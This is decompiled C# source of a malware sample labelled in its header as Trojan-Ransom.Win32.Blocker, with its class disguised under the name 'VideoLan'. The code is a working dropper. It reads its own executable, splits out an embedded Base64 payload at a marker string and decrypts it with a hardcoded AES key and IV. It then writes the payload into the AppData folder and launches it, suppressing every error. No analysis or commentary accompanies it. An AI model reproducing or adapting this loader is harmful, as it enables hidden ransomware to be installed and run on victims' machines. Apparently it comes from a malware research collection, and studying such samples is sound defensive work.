// Decompiled with JetBrains decompiler
// Type: VideoLan.VideoLan
// Assembly: survey, Version=10.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BF79F755-830B-4EFF-B237-5750697B71C1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.asdr-93db29c62d1a1115dcc19579ecabcca20a2a4816fa39c2f5239da604736af202.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace VideoLan
{
  internal class VideoLan
  {
    private static byte[] FileContinent;
    private static string[] MCSplit = new string[1]
    {
      "[zZPM6EuHbZkji3gNSkS3IW6KO]"
    };
    private static string[] FileInfo;
    private static string FileText;
    private static string AppFolder;

    private static void Main(string[] args)
    {
      try
      {
        VideoLan.VideoLan.FileText = VideoLan.VideoLan.ReadFile();
        VideoLan.VideoLan.AppFolder = VideoLan.VideoLan.FindFolder();
        VideoLan.VideoLan.FileInfo = VideoLan.VideoLan.MCEn();
        VideoLan.VideoLan.FileContinent = VideoLan.VideoLan.MCTje(Convert.FromBase64String(VideoLan.VideoLan.FileInfo[1]));
        VideoLan.VideoLan.Writing();
        VideoLan.VideoLan.StartDia();
      }
      catch
      {
      }
    }

    private static string Writing()
    {
      try
      {
        File.WriteAllBytes(VideoLan.VideoLan.AppFolder + "\\" + VideoLan.VideoLan.FileInfo[2], VideoLan.VideoLan.FileContinent);
        return "yes";
      }
      catch
      {
        return "no";
      }
    }

    private static string FindFolder()
    {
      try
      {
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      }
      catch
      {
        return "";
      }
    }

    private static byte[] MCTje(byte[] RijnKey)
    {
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] numArray1 = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        byte[] numArray2 = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        rijndaelManaged.IV = numArray1;
        rijndaelManaged.Key = numArray2;
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RijnKey, 0, RijnKey.Length);
      }
      catch
      {
        return (byte[]) null;
      }
    }

    private static string StartDia()
    {
      try
      {
        Process.Start(VideoLan.VideoLan.AppFolder + "\\" + VideoLan.VideoLan.FileInfo[2]);
        return "yes";
      }
      catch
      {
        return "no";
      }
    }

    private static string[] MCEn()
    {
      try
      {
        return VideoLan.VideoLan.FileText.Split(VideoLan.VideoLan.MCSplit, StringSplitOptions.None);
      }
      catch
      {
        return new string[2]{ "z", "e" };
      }
    }

    private static string ReadFile()
    {
      try
      {
        return File.ReadAllText(Process.GetCurrentProcess().MainModule.FileName);
      }
      catch
      {
        return "";
      }
    }
  }
}
